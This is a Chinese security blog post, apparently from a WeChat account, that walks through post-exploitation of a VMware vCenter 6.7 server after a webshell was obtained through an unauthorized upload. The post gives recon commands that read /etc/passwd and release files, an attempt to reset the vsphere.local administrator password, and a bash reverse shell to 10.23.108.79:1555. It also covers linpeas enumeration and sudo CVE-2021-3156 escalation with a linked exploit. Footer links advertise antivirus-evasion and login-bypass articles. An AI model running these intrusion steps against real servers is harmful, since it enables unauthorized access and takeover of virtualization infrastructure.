#  【护网必问】Vcenter后渗透漏洞应用！   
 进击的HACK   2024-05-06 21:51  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQpAnrqNicQd9iaTIQg3TZia6nrUbV4G5Q5Q6Bg9beNgubWmsxPvjqpZ2D57rOZGdHvvbWPzQu2g3FnrQ/640?wx_fmt=png&from=appmsg "")  
  
**点击蓝字，立即关注**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQpAnrqNicQd9iaTIQg3TZia6nrSdSa2Gp5kJtMgzfxVhvDI0XO1Pf2ibgxmJBIQAdHFrUIdxDEJpJc4Cg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QABjQccnicQqZDxLPGu2a3WsfLibic8pjh5iboXZCanY4cPfn2J528ibiaCzUeLniaO1fPYyxq0rb7icld3jm0Qiad2e9icg/640?wx_fmt=gif "")  
  
前言：通过未授权前台上传shell成功拿到webshell，这几天面试题问的多，就先尝试一下Vcenter后渗透  
  
**漏洞版本****->6.71**  
  
https://10.128.23.123/sdk/vimServiceVersions.xml  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvQwArYWcIQhq8Xwz6ogz1XpRzeicV50Uk0nJUKU5sDShjdraciclwjIww/640?wx_fmt=png&from=appmsg "")  
  
  
```
VMware vCenter Server 7.0系列< 7.0.U1c


VMware vCenter Server 6.7系列< 6.7.U3l


VMware vCenter Server 6.5系列< 6.5 U3n
```  
  
研判容器  
```
cat /proc/1/cgroup
```  
  
**通常需要检查****/proc/1/cgroup****文件中的内容。在容器中，通常会有类似于****$1:name=systemd:/docker/$container_id****的行，其中****$container_id****是容器的唯一标识符。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvGmibAV2wlyn7MvPo5ZleQ4IzS0zfeib4GdicwOV5eRbicHkwUO5wQ786Ng/640?wx_fmt=png&from=appmsg "")  
  
  
  
**这里我们判断是非容器了且执行权限不是****root****，权限一般般**  
```
su
```  
```
chmod +x /etc/sudoers
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvysHpX9s4WnKgXFWqmNH3aznziak4Ru6BRxexzjtibfT1Cp8e0ACJvibIA/640?wx_fmt=png&from=appmsg "")  
  
  
  
提权  
```
cat /etc/*-release
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvSS9kpQwlaHIvdnkeuoK5YrJraKTPGMMQFicF7dXDnzM36B2FJzeQZiaw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibv0s0cwJXK5Ire8gnFzeKic5hpUSrLIuHFkjbk2rKSx6pOBhRtwfSjfEw/640?wx_fmt=png&from=appmsg "")  
  
  
  
**VMware Photon.....****第一次听这个操作系统，以为是容器但是前面判断并没有什么****container-id****，于是去问****gpt****。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvmNdYFtCbWaCFpX2wlhx6A1lPeL7Oib2DfqpuhLQExUgfbDwekiaxicmXA/640?wx_fmt=png&from=appmsg "")  
  
  
  
**用了一个提权脚本，以失败告终**  
```
https://github.com/worawit/CVE-2021-3156/blob/main/exploit_defaults_mailer.py
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvYx5ic23FNmV5W7193QsZfSrjIMdicrxPRS1lLB2puFMVjfFSnamhyZGw/640?wx_fmt=png&from=appmsg "")  
  
  
  
**看看有哪些管理员账户吧**  
```
cat /etc/passwd
```  
  
**可以发现****uid****为****0****的只有****root****账户**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvJryC941bic6SwpWOicNSw5blCXsoWKgIh1DhZ2OqlrFJaIW0FcmFKibBA/640?wx_fmt=png&from=appmsg "")  
  
  
  
遍历域账户  
```
/usr/lib/vmware-vmafd/bin/vmafd-cli get-domain-name --server-name localhost
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvhkhG7iazaeIVwsd2vIbLkwLRbHcgt64Uiceh9gwZg1s7UtThZJc1ZmhQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
**重置域账户密码，失败了，很好，还是权限的问题。**  
```
/usr/lib/vmware-vmdir/bin/vdcadmintool


administrator@vsphere.local
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvCD7lFe9OFkW7W3wV7oJUKCmdl8FVOhHgyLsgr8F4cA6PHYuDibHD7Ww/640?wx_fmt=png&from=appmsg "")  
  
  
  
**先反弹到我主机上来**  
```
nc -lvvp 1555


bash -i >& /dev/tcp/10.23.108.79/1555 0>&1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibv2hSdVUDEoJCOI9Nj4CNSCibxnHxGA60MrSUQa7PzkoeZcplPRVtic0lw/640?wx_fmt=png&from=appmsg "")  
  
  
  
**linpeas提权**  
  
直接在我windows上启动msf，正向shell试试看。  
```
uname -a
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvNoBJgGXKNYrXyuz5udb21w7YoU420NtxlDmU9XYEmgtzXrc56BZrdA/640?wx_fmt=png&from=appmsg "")  
  
  
```
lscpu
```  
  
**确定是虚拟机搭建**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibv3FWvNJJcGlqxzYDnlIZgYr2R2ttjFkyFrNjOLC2VCvqRY38ktAuWmA/640?wx_fmt=png&from=appmsg "")  
  
  
```
./linpeas.sh
```  
  
**这里列举了一堆可以进行提权的历史漏洞**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvFzFzic28ibG9IJoWPjGjXZicaqv4qtEGpk0qObyFjOtspYtfO4fgFibibuw/640?wx_fmt=png&from=appmsg "")  
  
  
  
**进一步证明为****vmware**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvg0EZM6lvtUp3lvdbfv9gJypDM3YGOz9boJCoU9ToOMPK6lLIQ7yuRg/640?wx_fmt=png&from=appmsg "")  
  
  
```
sudo -V
```  
  
**sudo****版本是****1.8.20p2****，存在****sudo****提权漏洞****CVE-2021-3156**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvFmjoTrRPLhMW4QThtpL80o1pUN7vrkaQgeHEyh9CXvuwC9IFzoNAyA/640?wx_fmt=png&from=appmsg "")  
  
  
```
sudoedit -s /
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvguNOkK4xBNuUCV2h9n7rJy6bQK9jHdsXafhXSPATh4cicPqoibTfPwsg/640?wx_fmt=png&from=appmsg "")  
  
  
  
**上传相关提权脚本后编译，直接告诉我无****make****指令，下载又需要****sudo****权限****...****泪目了，后续通过上传编译脚本直接拿下**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibveIPQ9vWsvV3qiccJHrD6MufXImQyILqOP63CYgPQX7fPokkiaz0CQhLg/640?wx_fmt=png&from=appmsg "")  
  
  
  
**END**  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QABjQccnicQqZDxLPGu2a3WsfLibic8pjh5MyYsDxTbnFICOQJHshAB7h6e9P0bhe1rGQYYbNp5zHibfHhneQTIkew/640?wx_fmt=gif "")  
  
  
  
**往期回顾**  
  
  
  
  
  
[](https://mp.weixin.qq.com/s?__biz=MzkyODMxODUwNQ==&mid=2247493380&idx=1&sn=9dec2f3d0c29d3238790ef87d9725fa1&chksm=c2183242f56fbb5485d1851f23ebd029168db6f25b02cf08dc67a2f9114ae9c9883254c8c079&token=1215047604&lang=zh_CN&scene=21#wechat_redirect)  
  
  
【独家揭秘】某EDU！Docker容器逃逸大揭秘！你的数据安全有多脆弱？  
  
[](https://mp.weixin.qq.com/s?__biz=MzkyODMxODUwNQ==&mid=2247493365&idx=1&sn=7869eba384e24f470087bc0ea810b40f&chksm=c21833b3f56fbaa5c080852fcf27fd0d85c115a39d6fd5c1841cfdb07c9d261756cdb9fe32b9&token=1215047604&lang=zh_CN&scene=21#wechat_redirect)  
  
  
【大招来袭】超强浏览器插件，助你绕过微信授权登录限制！  
  
[](https://mp.weixin.qq.com/s?__biz=MzkyODMxODUwNQ==&mid=2247493312&idx=1&sn=eb083a1390bd0ed27af318ed3a8f571e&chksm=c2183386f56fba903e0defe9f34ba7049252709dc7646932f1444b9981b9fccfe74850d90a91&token=347263275&lang=zh_CN&scene=21#wechat_redirect)  
  
  
过火绒、腾讯管家、defender免杀思路分享  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vnT4hbaLoX6HZD1eqoFicUwpGtOJIMjcsRAkfgiaaxnugt26pP2Aibniav9gH9tRCXQWG1ygOvjc0LHP6IdUuF5icHA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibv3anOiceibXz1VXdKykRDqLyrk9ubOM2B5tRSkWicFjeAAN47KCIPDzpibg/640?wx_fmt=gif&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vnT4hbaLoX6HZD1eqoFicUwpGtOJIMjcsGmAjFmx5BZaWVnJSRoic7JM0ceppYVF5c3jJRGI3BsLazTl0ELheVjw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvtHfL30icuTkniaIF9A7pic4bt0p3KFmPQcaS0icTuMOY6deUQ8kibUUeB4w/640?wx_fmt=gif&from=appmsg "")  
  
**点分享**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvoy9eXJicIJ9p79UjBjP7iaEWryj9o9ibupMrG4HcvdugXGRHtCoLOstDw/640?wx_fmt=gif&from=appmsg "")  
  
**点收藏**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvMraoEON2nL5fg20ECwdlGgntFyIGYBonJA5fZ2jfchYELY65t705IA/640?wx_fmt=gif&from=appmsg "")  
  
**点在看**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QABjQccnicQo6Vib6aHTxPmqksY3dmjKibvp0ZQQgGHMegb5K0IuC1U5OeLvehQGZS753IApMdDPSaLWwAcSD3BWQ/640?wx_fmt=gif&from=appmsg "")  
  
**点点赞**  
  
